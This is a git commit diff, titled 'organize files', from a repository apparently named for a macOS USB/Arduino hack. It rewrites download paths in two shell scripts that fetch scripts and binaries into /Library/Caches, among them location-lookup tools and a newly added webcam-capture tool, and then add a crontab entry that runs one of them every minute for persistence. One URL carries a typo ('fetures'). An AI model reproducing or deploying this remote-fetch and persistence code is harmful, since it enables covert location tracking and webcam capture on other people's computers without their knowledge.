30fe09941f5bb70204695661048b809363896975
Angel Diaz <angel.diaz@gmail.com>
2019-01-28 09:53:30 +0100

    organize files

--- crons/cron-60.sh
+++ crons/cron-60.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
-wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-01.sh
-wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-05.sh
-wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-60.sh
-wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/soundalarm.scpt
-wget -O /Library/Caches/getlocation.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/getlocation.scpt
-wget -O /Library/Caches/smoke.aiff https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/smoke-alarm.aiff
-wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/LocateMe
+wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-01.sh
+wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-05.sh
+wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-60.sh
+wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/soundalarm.scpt
+wget -O /Library/Caches/getlocation.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/getlocation.scpt
+wget -O /Library/Caches/smoke.aiff https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/smoke-alarm.aiff
+wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/fetures/LocateMe
 
--- startup.sh
+++ startup.sh
@@ -1,10 +1,11 @@
 #!/bin/bash
-wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-01.sh
-wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-05.sh
-wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-60.sh
-wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/soundalarm.scpt
-wget -O /Library/Caches/getlocation.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/getlocation.scpt
-wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/LocateMe
+wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-01.sh
+wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-05.sh
+wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-60.sh
+wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/soundalarm.scpt
+wget -O /Library/Caches/getlocation.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/getlocation.scpt
+wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/LocateMe
+wget -O /Library/Caches/imagesnap https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/imagesnap
 
 # Add cron task to run every minute
 ( crontab -l ; echo "* * * * * /bin/sh /Library/Caches/cron-01.sh" ) | crontab -
